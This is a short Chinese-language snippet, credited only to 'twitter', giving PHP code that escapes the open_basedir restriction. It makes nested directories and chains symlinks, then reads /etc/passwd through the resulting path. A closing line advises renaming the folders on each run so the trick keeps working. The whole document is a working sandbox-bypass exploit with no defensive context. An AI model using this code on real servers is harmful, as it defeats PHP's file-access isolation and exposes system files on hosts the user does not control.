参考：
- twitter

```php
mkdir('/var/www/html/a/b/c/d/e/f/g/',0777,TRUE);
symlink('/var/www/html/a/b/c/d/e/f/g','foo');
ini_set('open_basedir','/var/www/html:bar/');
symlink('foo/../../../../../../','bar');
unlink('foo');
symlink('/var/www/html','foo');
echo file_get_contents('bar/etc/passwd');
```

每次要更换文件夹a和bar和foo，不然会报错文件已存在。